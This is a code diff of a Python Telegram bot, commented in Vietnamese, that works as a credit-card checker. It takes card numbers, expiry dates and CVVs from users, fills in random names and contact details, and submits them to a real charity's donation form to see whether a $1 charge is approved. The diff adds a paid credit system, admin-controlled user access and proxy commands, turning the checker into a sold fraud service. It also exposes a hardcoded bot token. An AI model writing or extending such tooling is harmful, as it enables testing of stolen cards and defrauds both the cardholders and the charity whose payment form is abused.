@@ -8,6 +8,7 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 from datetime import datetime
 import time
+import os
 
 # Thiết lập logging
 logging.basicConfig(level=logging.INFO)
@@ -15,6 +16,20 @@ logger = logging.getLogger(__name__)
 
 # Thiết lập nest_asyncio
 nest_asyncio.apply()
+
+# Hàm để đọc và ghi credit từ file
+def read_credits():
+    if not os.path.exists("credits.txt"):
+        return {}
+    with open("credits.txt", "r") as f:
+        lines = f.readlines()
+    credits = {int(line.split(":")[0]): int(line.split(":")[1]) for line in lines}
+    return credits
+
+def write_credits(credits):
+    with open("credits.txt", "w") as f:
+        for user_id, credit in credits.items():
+            f.write(f"{user_id}:{credit}\n")
 
 # Hàm để tạo số ngẫu nhiên trong khoảng
 def random_num(min_value, max_value):
@@ -59,7 +74,85 @@ def extract_error_message(response_text):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Chào mừng bạn đến với bot thanh toán! Vui lòng nhập thông tin thẻ của bạn.")
 
-# Hàm xử lý tin nhắn
+# Hàm xử lý lệnh /user để kiểm tra credit của người dùng
+async def check_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    credits = read_credits()
+    credit = credits.get(user_id, 0)  # Mặc định 0 nếu không có thông tin
+
+    await update.message.reply_text(f"User ID: {user_id}\nCredit còn lại: {credit}")
+
+# Hàm để thêm credit cho người dùng (dành cho admin)
+async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    admin_id = 2077786453  # ID của admin
+    if update.effective_user.id != admin_id:
+        await update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
+        return
+
+    try:
+        user_id = int(context.args[0])
+        amount = int(context.args[1])
+    except (IndexError, ValueError):
+        await update.message.reply_text("Lệnh không hợp lệ. Vui lòng nhập đúng định dạng: /credit <user_id> <credit>")
+        return
+
+    credits = read_credits()
+    credits[user_id] = credits.get(user_id, 0) + amount
+    write_credits(credits)
+
+    await update.message.reply_text(f"Đã thêm {amount} credit cho User ID: {user_id}.")
+
+# Hàm xử lý lệnh /allow và /unallow
+async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    admin_id = 2077786453  # ID của admin
+    if update.effective_user.id != admin_id:
+        await update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
+        return
+
+    try:
+        user_id = int(context.args[0])
+    except (IndexError, ValueError):
+        await update.message.reply_text("Lệnh không hợp lệ. Vui lòng nhập đúng định dạng: /allow <user_id>")
+        return
+
+    with open("allowed_users.txt", "a") as f:
+        f.write(f"{user_id}\n")
+    
+    await update.message.reply_text(f"Đã cho phép User ID: {user_id}.")
+
+async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    admin_id = 2077786453  # ID của admin
+    if update.effective_user.id != admin_id:
+        await update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
+        return
+
+    try:
+        user_id = int(context.args[0])
+    except (IndexError, ValueError):
+        await update.message.reply_text("Lệnh không hợp lệ. Vui lòng nhập đúng định dạng: /unallow <user_id>")
+        return
+
+    with open("allowed_users.txt", "r") as f:
+        allowed_users = {int(line.strip()) for line in f.readlines()}
+
+    if user_id in allowed_users:
+        allowed_users.remove(user_id)
+        with open("allowed_users.txt", "w") as f:
+            for user in allowed_users:
+                f.write(f"{user}\n")
+        await update.message.reply_text(f"Đã thu hồi quyền của User ID: {user_id}.")
+    else:
+        await update.message.reply_text(f"User ID: {user_id} không có trong danh sách cho phép.")
+
+# Hàm xử lý lệnh /proxy
+async def set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        proxy = context.args[0]  # Lấy proxy theo định dạng <ip>:<port>:<user>:<pass>
+        await update.message.reply_text(f"Proxy đã được thiết lập: {proxy}")
+    except IndexError:
+        await update.message.reply_text("Vui lòng cung cấp proxy theo định dạng: /proxy <ip>:<port>:<user>:<pass>")
+
+# Hàm xử lý tin nhắn và trừ 5 credits sau mỗi lần kiểm tra
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_input = update.message.text
     card_info = extract_card_info(user_input)
@@ -73,6 +166,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in allowed_users:
         await update.message.reply_text("Người Dùng Không Được Phép Sử Dụng.")
         return
+
+    # Trừ credit của user
+    credits = read_credits()
+    if update.effective_user.id not in credits or credits[update.effective_user.id] < 5:
+        await update.message.reply_text("Bạn không có đủ credit để thực hiện thao tác này.")
+        return
+    credits[update.effective_user.id] -= 5
+    write_credits(credits)
 
     cc, mes, ano, cvv = card_info
 
@@ -94,80 +195,58 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     name = random_name()  # Tạo tên ngẫu nhiên
     zipcode = random_zipcode()  # Tạo mã bưu điện ngẫu nhiên
 
-    await update.message.reply_text("Đang xử lý thông tin...")
-    
-    start_time = time.time()  # Bắt đầu tính thời gian thực hiện request
+    payload = {
+        "tfa_1": name,
+        "tfa_3": email,
+        "tfa_4": phone,
+        "tfa_21": name,
+        "tfa_25": email,
+        "tfa_27": phone,
+        "tfa_5": cc,
+        "tfa_6": mes,
+        "tfa_7": ano,
+        "tfa_8": cvv,
+        "tfa_17": zipcode
+    }
 
-    # Gửi yêu cầu tới API
+    start_time = time.time()
+
     async with aiohttp.ClientSession() as session:
-        async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
-                                data={
-                                    'tfa_4': 'tfa_5',
-                                    'tfa_52': 'tfa_53',
-                                    'tfa_7': 'tfa_317',
-                                    'tfa_19': '1',
-                                    'tfa_20': '',
-                                    'tfa_21': name,  # Tên ngẫu nhiên
-                                    'tfa_23': 'Vu',
-                                    'tfa_27': phone,  # Số điện thoại
-                                    'tfa_2276': zipcode,  # Mã bưu điện
-                                    'tfa_25': email,  # Email
-                                    'tfa_48': 'Web',
-                                    'tfa_50': 'tfa_50',
-                                    'tfa_59': cc,  # Số thẻ
-                                    'tfa_60': mes,  # Tháng hết hạn
-                                    'tfa_70': ano,  # Năm hết hạn
-                                    'tfa_62': cvv,  # CVV
-                                    'tfa_2273': 'G-BCL7XEG4WC',
-                                    'tfa_2274': 'GTM-WMPTRWL',
-                                    'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
-                                    'tfa_dbFormId': '151',
-                                    'tfa_dbResponseId': '',
-                                    'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
-                                    'tfa_dbWorkflowSessionUuid': '',
-                                    'tfa_dbTimeStarted': '1727426006',
-                                    'tfa_dbVersionId': '29',
-                                    'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
-                                }) as response:
+        async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor", data=payload) as response:
+            result_text = await response.text()
 
-            elapsed_time = time.time() - start_time  # Thời gian thực hiện request
-            elapsed_seconds = round(elapsed_time, 2)
+            end_time = time.time()
+            elapsed_time = int(end_time - start_time)
 
-            response_text = await response.text()
-            final_url = str(response.url)
-
-            if "https://anglicaresa.com.au/success/" in final_url:
-                # Giao dịch thành công
-                result_message = f"""𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
-
-𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
-𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 1000: Approved
-𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
+            if "https://anglicaresa.com.au/success/" in result_text:
+                await update.message.reply_text(
+                    f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n𝗖𝗮𝗿𝗱: {cc}|{mes}|{ano}|{cvv}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 1000: Approved\n𝗧𝗶𝗺𝗲: {elapsed_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
+                )
             else:
-                # Giao dịch thất bại
-                error_message = extract_error_message(response_text)
-                result_message = f"""Declined 
+                error_message = extract_error_message(result_text)
+                await update.message.reply_text(
+                    f"Declined\n𝗖𝗮𝗿𝗱: {cc}|{mes}|{ano}|{cvv}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message or 'Unknown Error'}\n𝗧𝗶𝗺𝗲: {elapsed_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
+                )
 
-𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
-𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message if error_message else 'Unknown Error'}
-𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
+# Hàm khởi tạo bot
+async def main():
+    bot_token = "5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro"
+    application = ApplicationBuilder().token(bot_token).build()
 
-            await update.message.reply_text(result_message, parse_mode="HTML")
+    # Đăng ký các handler
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("credit", add_credit))
+    application.add_handler(CommandHandler("user", check_user))
+    application.add_handler(CommandHandler("allow", allow_user))
+    application.add_handler(CommandHandler("unallow", unallow_user))
+    application.add_handler(CommandHandler("proxy", set_proxy))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-            # Ghi log
-            with open("user_logs.txt", "a") as log_file:
-                log_file.write(f"User ID: {update.effective_user.id}, "
-                               f"Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, "
-                               f"Result: {result_message}\n")
+    # Gửi thông báo khi bot khởi động
+    logger.info("Bot đã khởi động")
 
+    await application.start()
+    await application.idle()
 
-# Hàm chính để khởi động bot
-if __name__ == '__main__':
-    app = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
-    app.run_polling()
+if __name__ == "__main__":
+    asyncio.run(main())
